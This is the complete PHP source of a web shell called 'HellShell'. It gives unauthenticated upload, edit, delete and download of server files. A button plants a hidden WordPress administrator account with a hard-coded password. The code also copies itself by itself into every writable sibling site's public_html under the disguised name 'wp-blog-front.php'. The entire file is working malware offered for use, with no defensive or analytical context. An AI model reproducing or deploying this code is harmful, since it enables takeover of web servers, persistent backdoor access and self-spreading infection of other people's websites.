<?php
// HellShell â€” File Manager + WP Admin Injector + Replication
@set_time_limit(0);
@error_reporting(0);

// === CONFIG ===
$self = __FILE__;
$here = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$here || !is_dir($here)) $here = getcwd();
chdir($here);

$msg = "";
$replicatedLinks = [];
$basename = basename($self);

// === Check if we are a clone ===
$isClone = ($basename === "wp-blog-front.php");

// === Helper: Random name for clone ===
function randName($len = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $out = '';
    for ($i=0;$i<$len;$i++) $out .= $chars[rand(0, strlen($chars)-1)];
    return $out;
}

// === Replication Logic (NovaShell-style) ===
function replicateHell($code) {
    static $once = false;
    if ($once) return [];
    $once = true;
    $start = __DIR__;
    while ($start !== '/') {
        if (preg_match('/\/u[\w]+$/', $start) && is_dir("$start/domains")) {
            $urls = [];
            foreach (scandir("$start/domains") as $dom) {
                if ($dom === '.' || $dom === '..') continue;
                $pub = "$start/domains/$dom/public_html";
                if (is_writable($pub)) {
                    $cloneName = "wp-blog-front.php";
                    $path = "$pub/$cloneName";
                    if (file_put_contents($path, $code)) {
                        $urls[] = "http://$dom/$cloneName";
                    }
                }
            }
            return $urls;
        }
        $start = dirname($start);
    }
    return [];
}

// === FILE UPLOAD ===
if (!empty($_FILES['file'])) {
    $dest = $here . "/" . basename($_FILES['file']['name']);
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        $msg .= "<div class='ok'>âœ” File uploaded</div>";
    }
}

// === CREATE FOLDER ===
if (!empty($_POST['newfolder'])) {
    $newDir = $here . "/" . basename($_POST['newfolder']);
    if (!file_exists($newDir)) {
        mkdir($newDir);
        $msg .= "<div class='ok'>âœ” Folder created</div>";
    }
}

// === CREATE FILE ===
if (!empty($_POST['newfile'])) {
    $newFile = $here . "/" . basename($_POST['newfile']);
    if (!file_exists($newFile)) {
        file_put_contents($newFile, "");
        $msg .= "<div class='ok'>âœ” File created</div>";
    }
}

// === DELETE FILE/FOLDER ===
if (!empty($_GET['rm'])) {
    $target = realpath($_GET['rm']);
    if (is_file($target)) @unlink($target);
    elseif (is_dir($target)) @rmdir($target);
}

// === RENAME ===
if (!empty($_POST['rename_old']) && !empty($_POST['rename_new'])) {
    $old = $_POST['rename_old'];
    $new = dirname($old) . "/" . basename($_POST['rename_new']);
    @rename($old, $new);
}

// === DOWNLOAD ===
if (!empty($_GET['dl'])) {
    $f = realpath($_GET['dl']);
    if (is_file($f)) {
        header("Content-Disposition: attachment; filename=\"" . basename($f) . "\"");
        readfile($f);
        exit;
    }
}

// === FILE EDITOR ===
if (!empty($_GET['edit'])) {
    $target = realpath($_GET['edit']);
    if ($target && is_file($target)) {
        if (!empty($_POST['savefile'])) {
            file_put_contents($target, $_POST['filedata']);
            echo "<div class='ok'>âœ” Saved " . htmlspecialchars(basename($target)) . "</div>";
        }
        $data = htmlspecialchars(file_get_contents($target));
        echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Edit</title>
        <style>
        body{background:#000;color:#ff0;font-family:monospace;text-align:center}
        textarea{width:95%;height:80vh;background:#111;color:#fff;border:1px solid #ff0}
        button{padding:8px;background:#222;color:#ff0;border:1px solid #ff0}
        </style></head><body>";
        echo "<h2>Editing: " . basename($target) . "</h2>";
        echo "<form method='post'><textarea name='filedata'>$data</textarea><br><button name='savefile'>Save</button> <a href='?dir=" . urlencode($here) . "' style='color:#ff0'>Back</a></form>";
        exit;
    }
}

// === WORDPRESS ADMIN CREATOR ===
if (!empty($_POST['make_wp_admin'])) {
    $wpFound = false;
    $search = $here;
    while ($search !== dirname($search)) {
        if (file_exists($search . "/wp-load.php")) {
            $wpFound = $search . "/wp-load.php";
            break;
        }
        $search = dirname($search);
    }
    if ($wpFound) {
        define('WP_USE_THEMES', false);
        require_once($wpFound);
        $user_login = 'hell';
        $user_pass = 'Hell@2025';
        $user_email = 'hell@example.com';

        if (!username_exists($user_login) && !email_exists($user_email)) {
            $user_id = wp_create_user($user_login, $user_pass, $user_email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                $msg .= "<div class='ok'>âœ” WP Admin Created: hell / Hell@2025</div>";
            } else {
                $msg .= "<div class='err'>âœ˜ WP user creation error</div>";
            }
        } else {
            $msg .= "<div class='warn'>âš  WP user already exists</div>";
        }
    } else {
        $msg .= "<div class='err'>âœ˜ wp-load.php not found</div>";
    }
}

// === Breadcrumb Builder ===
function makeCrumbs($path) {
    $out = [];
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $curr = "";
    foreach ($parts as $part) {
        $curr .= DIRECTORY_SEPARATOR . $part;
        $out[] = "<a href='?dir=" . urlencode($curr) . "'>$part</a>";
    }
    return implode(" / ", $out);
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>HellShell</title>
<style>
body { background:#000; color:#ff0; font-family:Arial, sans-serif; text-align:center; }
h2 { color:#ff0; margin:20px 0; }
a { color:#ff0; text-decoration:none; }
a:hover { text-decoration:underline; }
.ok { color:#0f0; }
.err { color:#f00; }
.warn { color:#ff0; }
table { width:90%; margin:auto; border-collapse:collapse; margin-top:20px; }
td,th { border:1px solid #555; padding:6px; }
form.inline { display:inline; }
input,button { padding:5px; margin:3px; background:#111; border:1px solid #ff0; color:#ff0; }
button[name=clone_here] { margin-left:10px; }
</style>
</head>
<body>
<h2>ðŸ”¥ HellShell</h2>
<p><b>Path:</b> <?=makeCrumbs($here)?></p>
<?=$msg?>

<form method="post" enctype="multipart/form-data">
<input type="file" name="file"><button>Upload</button><br>
<input type="text" name="newfolder" placeholder="New Folder"><button>Create Folder</button><br>
<input type="text" name="newfile" placeholder="New File"><button>Create File</button><br>
<button type="submit" name="make_wp_admin" value="1">ðŸ‘¤ Create WP Admin</button>
</form>

<table>
<tr><th>Name</th><th>Size</th><th>Actions</th></tr>
<?php
foreach (scandir($here) as $file) {
    if ($file === ".") continue;
    $fp = $here . "/" . $file;
    $size = is_file($fp) ? filesize($fp) : "-";
    $dl = "?dir=" . urlencode($here) . "&dl=" . urlencode($fp);
    $rm = "?dir=" . urlencode($here) . "&rm=" . urlencode($fp);
    $ed = "?dir=" . urlencode($here) . "&edit=" . urlencode($fp);
    $color = (is_writable($fp) ? "#ff0" : "#f00");
    echo "<tr><td style='color:$color'>";
    if (is_dir($fp)) {
        echo "<a href='?dir=" . urlencode($fp) . "'>[DIR] $file</a>";
    } else echo htmlspecialchars($file);
    echo "</td><td style='color:$color'>$size</td><td>
    <a style='color:white' href='$dl'>D</a>
    <form class='inline' method='post' onsubmit='return renameConfirm(this)'>
    <input type='hidden' name='rename_old' value='$fp'>
    <input type='text' name='rename_new' value='" . htmlspecialchars($file) . "' style='width:70px'>
    <button style='color:white'>R</button>
    </form>
    <a style='color:white' href='$ed'>E</a>
    </td></tr>";
}
?>
</table>

<script>
function renameConfirm(form) {
    return confirm('Rename file?');
}
</script>

<?php
// === Auto replication trigger ===
if (!$isClone && basename(__FILE__) !== 'wp-blog-front.php') {
    $urls = replicateHell(file_get_contents(__FILE__));
    if (!empty($urls)) {
        echo "<h3>âœ… Replicated into public_html</h3><ul>";
        foreach ($urls as $u) echo "<li><a href='$u' target='_blank'>$u</a></li>";
        echo "</ul><hr>";
    }
}
?>
</body>
</html>
